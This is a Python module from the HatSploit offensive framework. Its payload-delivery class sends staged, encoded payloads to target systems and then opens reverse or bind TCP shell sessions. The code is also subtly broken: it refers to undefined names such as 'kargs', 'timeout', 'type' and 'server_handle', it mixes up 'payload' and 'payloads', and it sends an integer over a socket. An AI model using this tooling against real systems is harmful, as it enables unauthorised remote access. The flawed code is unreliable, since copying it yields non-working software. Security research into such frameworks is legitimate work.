"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket

from typing import Callable, Any, Optional, Tuple, Union

from pex.post import Post, PostTools

from hatsploit.lib.session import Session
from hatsploit.lib.payload import Payload
from hatsploit.lib.encoder import Encoder
from hatsploit.lib.payloads import Payloads
from hatsploit.lib.handle import Handle

from hatsploit.core.cli.badges import Badges

from pawn import Pawn


class Hand(object):
    """ Subclass of hatsploit.lib.handler module.

    This subclass of hatsploit.lib.handler module is intended for
    providing tools for sending payloads.
    """

    def __init__(self) -> None:
        super().__init__()

        self.handle = Handle()
        self.payloads = Payloads()

        self.post = Post()
        self.post_tools = PostTools()

        self.badges = Badges()

        self.pawn = Pawn()

    def handle_session(self, host: str, port: int, type: str = 'one_side',
                       session: Optional[Session] = None,
                       timeout: Optional[int] = None) -> Tuple[Union[Session, socket.socket], str]:
        """ Handle session.

        :param str host: server host or host to connect to (depends on type)
        :param int port: server port ot port to connect to (depends on type)
        :param str type: type of payload (see self.types)
        :param Optional[Session] session: session handler
        :param Optional[int] timeout: timeout
        :return Tuple[Union[Session, socket.socket], str]: session and host
        :raises RuntimeWarning: with trailing warning message
        :raises RuntimeError: with trailing error message
        """

        if type not in self.types:
            raise RuntimeError(f"Invalid payload type: {type}!")

        if type == 'reverse_tcp':
            if not host or not port:
                raise RuntimeError("Reverse TCP requires host and port set!")

            client, host = self.server_handle.listen_session(host, port, session, timeout)

            if not client and not host:
                raise RuntimeError("Reverse TCP received corrupted session!")

            return client, host

        elif type == 'bind_tcp':
            if not host or not port:
                raise RuntimeError("Bind TCP requires host and port set!")

            client = self.server_handle.connect_session(host, port, session, timeout)

            if not client:
                raise RuntimeError("Bind TCP received corrupted session!")

            return client, host

        else:
            raise RuntimeWarning("Payload sent, but not session was opened.")

    def phaseless_payload(self, payload: Payload, host: str, port: int,
                          encoder: Optional[Encoder] = None,
                          *args, **kwargs) -> None:
        """ Send payload to the target system.

        :param Payload payload: payload
        :param str host: host to start listener on or connect to
        :param int port: port to start listener on or connect to
        :param Optional[Encoder] encoder: encoder to apply
        :return None: None
        """

        if not payload:
            raise RuntimeError("Payload was not found!")

        sender = kwargs.pop('sender', None)

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if 'Arguments' in payload.details:
            arguments = payload.details['Arguments']
        else:
            arguments = ''

        platform = payload.details['Platform']
        arch = payload.details['Architecture']

        stage = self.payloads.run_payload(payload, encoder)
        space = kwargs.pop('space', 4096)

        if len(stage) >= space:
            zero_stage = self.pawn.get_stage(
                payload=stage,
                platform=platform,
                arch=arch,
                type=payload.details['Type']
            )

            zero_stage = self.payload.pack_payload(zero_stage, platform, arch)

            self.badges.print_process(f"Sending payload phase ({str(len(zero_stage))} bytes)...")
            self.post.post(
                sender=sender,
                stage=zero_stage,
                platform=platform,
                architecture=arch,
                *args, **kwargs
            )

            client, host = self.handle_session(
                host=host,
                port=port,
                type=type,
                session=None,
                timeout=timeout
            )

            stage = self.payloads.pack_payload(
                stage,
                platform,
                arch
            )

            self.badges.print_process(f"Sending payload ({str(len(stage))} bytes)...")
            client.send(len(stage))
            client.send(stage)

        else:
            stage = self.payloads.pack_payload(
                stage,
                platform,
                arch
            )

            self.badges.print_process(f"Sending payload ({str(len(stage))} bytes)...")
            self.post.post(
                sender=sender,
                stage=stage,
                platform=platform,
                architecture=arch,
                arguments=arguments,
                *args, **kwargs
            )

    def phase_payload(self, payload: Payload, host: str, port: int,
                      encoder: Optional[Encoder] = None,
                      *args, **kwargs) -> None:
        """ Send phase and then payload.

        :param Payload payload: payload
        :param str host: host to start listener on or connect to
        :param int port: port to start listener on or connect to
        :param Optional[Encoder] encoder: encoder to apply
        :return None: None
        """

        if not payload:
            raise RuntimeError("Payload was not found!")

        sender = kwargs.pop('sender', None)

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if not host and not port:
            raise RuntimeError("Host and port were not found for stage0!")

        platform = payload.details['Platform']
        arch = payload.details['Architecture']

        stage = self.payloads.run_payload(payload, encoder)
        space = kwargs.pop('space', 4096)

        if len(stage) >= space:
            zero_stage = self.pawn.get_stage(
                payload=stage,
                platform=platform,
                arch=arch,
                type=payload.details['Type']
            )

            self.badges.print_process(f"Sending payload phase ({str(len(zero_stage))} bytes)...")
            self.post_tools.post_payload(
                sender=sender,
                payload=zero_stage,
                *args, **kargs
            )

            client, host = self.handle_session(
                host=host,
                port=port,
                type=type,
                session=None,
                timeout=timeout
            )

            stage = self.payloads.pack_payload(
                stage,
                platform,
                arch
            )

            self.badges.print_process(f"Sending payload ({str(len(stage))} bytes)...")
            client.send(stage)

        else:
            self.badges.print_process(f"Sending payload ({str(len(stage))} bytes)...")
            self.post_tools.post_payload(
                sender=sender,
                payload=stage,
                *args, **kargs
            )
